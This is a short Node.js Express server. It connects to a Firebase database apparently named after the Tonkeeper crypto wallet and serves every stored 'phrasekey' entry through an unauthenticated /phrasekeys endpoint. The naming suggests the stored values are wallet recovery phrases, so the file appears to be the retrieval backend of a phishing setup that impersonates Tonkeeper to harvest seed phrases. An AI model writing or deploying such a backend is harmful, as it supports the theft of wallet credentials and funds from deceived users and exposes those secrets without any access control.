const express = require('express');
const admin = require('firebase-admin');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Path to service account JSON file
const serviceAccountPath = path.join(__dirname, 'tonkeeper-948de-firebase-adminsdk-fbsvc-517dbf36e1.json');

// Initialize Firebase Admin SDK
if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(require(serviceAccountPath)),
        databaseURL: "https://tonkeeper-948de-default-rtdb.firebaseio.com/"
    });
}

const db = admin.database();

// API to get list of phrase keys
app.get('/phrasekeys', async (req, res) => {
    try {
        const ref = db.ref('phrasekey'); // Adjust based on your database structure
        const snapshot = await ref.once('value');

        if (snapshot.exists()) {
            res.json(snapshot.val());
        } else {
            res.json({ message: 'No data found' });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});